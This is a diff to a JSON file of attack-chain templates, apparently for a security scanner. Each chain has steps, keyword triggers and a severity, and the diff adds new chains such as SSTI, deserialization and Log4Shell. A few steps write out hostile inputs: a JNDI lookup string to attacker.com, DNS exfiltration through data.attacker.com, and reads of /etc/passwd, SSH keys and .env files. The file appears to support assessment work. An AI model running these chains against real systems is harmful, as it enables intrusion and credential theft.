@@ -3,130 +3,320 @@
     "name": "SSRF to Cloud Metadata",
     "steps": [
       "SSRF vulnerability",
-      "Access cloud metadata",
-      "Steal credentials"
+      "Access cloud metadata (169.254.169.254)",
+      "Steal IAM credentials"
     ],
-    "required_findings": [
-      "SSRF",
-      "Cloud metadata endpoint"
-    ],
+    "required_findings": ["SSRF", "cloud"],
     "severity": "CRITICAL"
   },
   {
     "name": "SQLi to OS Command",
     "steps": [
       "SQL injection",
-      "Write webshell",
-      "RCE"
+      "Write webshell via INTO OUTFILE or xp_cmdshell",
+      "RCE via webshell or OS command"
     ],
-    "required_findings": [
-      "SQL injection",
-      "MySQL/MSSQL/PostgreSQL"
-    ],
+    "required_findings": ["SQL injection", "mysql"],
     "severity": "CRITICAL"
   },
   {
     "name": "XSS to Cookie Steal",
     "steps": [
       "XSS vulnerability",
-      "Steal session cookie",
+      "Steal session cookie via document.cookie",
       "Session hijacking"
     ],
-    "required_findings": [
-      "XSS",
-      "Session cookies"
-    ],
+    "required_findings": ["XSS", "cookie"],
     "severity": "HIGH"
   },
   {
     "name": "IDOR to Account Takeover",
     "steps": [
       "IDOR vulnerability",
-      "Modify user ID",
-      "Access other accounts"
+      "Enumerate user IDs to find admin",
+      "Access/modify other accounts"
     ],
-    "required_findings": [
-      "IDOR",
-      "User endpoint"
-    ],
+    "required_findings": ["IDOR", "user"],
     "severity": "HIGH"
   },
   {
     "name": "File Upload to RCE",
     "steps": [
       "Unrestricted file upload",
-      "Upload webshell",
-      "Execute shell"
+      "Upload webshell (PHP/JSP/ASPX)",
+      "Execute shell commands via HTTP"
     ],
-    "required_findings": [
-      "File upload",
-      "Web shell"
-    ],
+    "required_findings": ["upload", "webshell"],
     "severity": "CRITICAL"
   },
   {
     "name": "LFI to RCE",
     "steps": [
       "LFI vulnerability",
-      "Log poisoning",
-      "RCE"
+      "Log poisoning via User-Agent injection",
+      "RCE via poisoned log include"
     ],
-    "required_findings": [
-      "LFI",
-      "Log file access"
-    ],
+    "required_findings": ["LFI", "log"],
     "severity": "CRITICAL"
   },
   {
     "name": "JWT Algorithm Confusion",
     "steps": [
       "JWT token",
-      "Algorithm confusion",
-      "Forge token"
+      "Algorithm confusion (RS256→HS256 or alg:none)",
+      "Forge admin token"
     ],
-    "required_findings": [
-      "JWT",
-      "Weak secret"
-    ],
+    "required_findings": ["JWT", "token"],
     "severity": "HIGH"
   },
   {
     "name": "OAuth Redirect Bypass",
     "steps": [
       "OAuth implementation",
-      "Redirect URI bypass",
+      "Redirect URI bypass / open redirect",
       "Steal authorization code"
     ],
-    "required_findings": [
-      "OAuth",
-      "Redirect URI"
-    ],
+    "required_findings": ["oauth", "redirect"],
     "severity": "HIGH"
   },
   {
     "name": "Docker Breakout",
     "steps": [
-      "Container access",
-      "Container escape",
+      "Container access via RCE",
+      "Privileged container escape",
       "Host compromise"
     ],
-    "required_findings": [
-      "Docker",
-      "Container"
-    ],
+    "required_findings": ["docker", "container"],
     "severity": "CRITICAL"
   },
   {
     "name": "Kubernetes Pod Escape",
     "steps": [
       "K8s pod access",
-      "Pod escape",
-      "Cluster compromise"
+      "Service account token theft",
+      "Cluster privilege escalation"
     ],
-    "required_findings": [
-      "Kubernetes",
-      "Pod"
-    ],
+    "required_findings": ["kubernetes", "pod"],
     "severity": "CRITICAL"
+  },
+  {
+    "name": "SSTI to Full RCE",
+    "steps": [
+      "Server-Side Template Injection found ({{7*7}}=49)",
+      "Escalate to OS command execution via template payload",
+      "Full server compromise"
+    ],
+    "required_findings": ["template", "ssti"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Prototype Pollution to RCE",
+    "steps": [
+      "Prototype pollution in Node.js merge/extend endpoint",
+      "Pollute process.binding or spawn prototype properties",
+      "Arbitrary command execution on server"
+    ],
+    "required_findings": ["prototype", "nodejs"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "XXE to SSRF and File Read",
+    "steps": [
+      "XXE injection in XML/SOAP/SVG",
+      "Read /etc/passwd and internal config files",
+      "SSRF to internal services via XXE SYSTEM entity"
+    ],
+    "required_findings": ["xxe", "xml"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "GraphQL IDOR to Data Theft",
+    "steps": [
+      "GraphQL introspection reveals schema and object types",
+      "Enumerate node(id:X) without ownership check",
+      "Exfiltrate cross-user data at scale via batched queries"
+    ],
+    "required_findings": ["graphql", "idor"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Deserialization to RCE",
+    "steps": [
+      "Unsafe deserialization endpoint found",
+      "Craft ysoserial/pickle/phpggc payload",
+      "Remote code execution via gadget chain"
+    ],
+    "required_findings": ["deserializ", "java"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Cache Poison to Stored XSS",
+    "steps": [
+      "Web cache poisoning via unkeyed header",
+      "Inject XSS payload into cached response body",
+      "XSS triggers for all users visiting the poisoned cached URL"
+    ],
+    "required_findings": ["cache", "xss"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "HTTP Smuggling to Auth Bypass",
+    "steps": [
+      "CL.TE or TE.CL request smuggling confirmed",
+      "Smuggle prefix to internal admin endpoint",
+      "Access privileged functionality without authentication"
+    ],
+    "required_findings": ["smuggling", "admin"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Path Traversal to Credential Theft",
+    "steps": [
+      "Path traversal in file/page/path parameter",
+      "Read /etc/passwd, SSH keys, .env, application configs",
+      "Use extracted credentials for lateral movement"
+    ],
+    "required_findings": ["traversal", "path"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Second-Order SQLi via Stored Input",
+    "steps": [
+      "Store SQLi payload in profile/username/note field",
+      "Payload executes when admin queries stored data",
+      "Extract database contents or escalate to admin"
+    ],
+    "required_findings": ["sql injection", "stored"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Mass Assignment to Admin Takeover",
+    "steps": [
+      "Mass assignment in user/profile API endpoint",
+      "Add role=admin or is_admin=true to update request",
+      "Full admin panel access without legitimate credentials"
+    ],
+    "required_findings": ["mass assignment", "admin"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "API Key Leakage to Full Account Takeover",
+    "steps": [
+      "API key exposed in JS file or response header",
+      "Use key to authenticate as service account",
+      "Access all data and functionality of associated account"
+    ],
+    "required_findings": ["api_key", "apikey"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Spring Boot Actuator to JMX RCE",
+    "steps": [
+      "Spring Boot actuator endpoint exposed (/actuator)",
+      "Access /actuator/jolokia for JMX interface",
+      "Execute OS command via MBeanServer createMBean or invoke"
+    ],
+    "required_findings": ["actuator", "spring"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "CORS Misconfig to Session Token Theft",
+    "steps": [
+      "CORS policy reflects arbitrary Origin with credentials",
+      "Craft cross-origin JS to fetch /api/user with credentials:include",
+      "Steal session data / JWT token from authenticated victim"
+    ],
+    "required_findings": ["cors", "session"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Subdomain Takeover to Cookie Theft",
+    "steps": [
+      "Dangling CNAME to unclaimed cloud service found",
+      "Register and claim the subdomain on the cloud provider",
+      "Set malicious cookie on *.domain.com to steal parent session"
+    ],
+    "required_findings": ["subdomain", "cname"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "SSRF to Redis Unauthorized Access",
+    "steps": [
+      "SSRF vulnerability with internal network access",
+      "Probe internal ports via gopher:// or http:// to Redis (6379)",
+      "Execute Redis commands to write webshell or steal data"
+    ],
+    "required_findings": ["ssrf", "redis"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Default Credentials to Internal Network",
+    "steps": [
+      "Admin panel with default credentials found (admin/admin)",
+      "Access management interface with full privileges",
+      "Pivot to internal network via admin console features"
+    ],
+    "required_findings": ["admin", "default"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Open Redirect to OAuth Token Theft",
+    "steps": [
+      "Open redirect in application (redirect_uri not validated)",
+      "Craft OAuth flow with attacker.com as redirect_uri",
+      "Steal authorization code from Referer header when victim redirects"
+    ],
+    "required_findings": ["redirect", "oauth"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "SQLi to Password Hash Dump and Crack",
+    "steps": [
+      "SQL injection confirmed — extractable query",
+      "Dump password hashes from users table",
+      "Crack with hashcat — offline brute force common passwords"
+    ],
+    "required_findings": ["sql injection", "hash"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Log4Shell JNDI to RCE",
+    "steps": [
+      "Java application with Log4j detected",
+      "Inject ${jndi:ldap://attacker.com/a} in user-controlled log field",
+      "JNDI callback triggers class loading — arbitrary code execution"
+    ],
+    "required_findings": ["log4j", "java"],
+    "severity": "CRITICAL"
+  },
+  {
+    "name": "Blind SSRF to OOB Data Exfiltration",
+    "steps": [
+      "Blind SSRF via URL parameter or webhook",
+      "Exfiltrate internal data via DNS subdomain (data.attacker.com)",
+      "Decode DNS queries to reconstruct leaked content"
+    ],
+    "required_findings": ["ssrf", "blind"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "GraphQL Batching to Credential Stuffing",
+    "steps": [
+      "GraphQL endpoint accepts batched mutation requests",
+      "Send 1000 login mutations in single request bypassing rate limit",
+      "Identify valid credentials from differential responses"
+    ],
+    "required_findings": ["graphql", "login"],
+    "severity": "HIGH"
+  },
+  {
+    "name": "Account Enumeration to Targeted Brute Force",
+    "steps": [
+      "Username enumeration via differential response (timing/message)",
+      "Build valid username list from registration or password reset",
+      "Targeted brute force against confirmed valid usernames"
+    ],
+    "required_findings": ["enumeration", "login"],
+    "severity": "MEDIUM"
   }
 ]
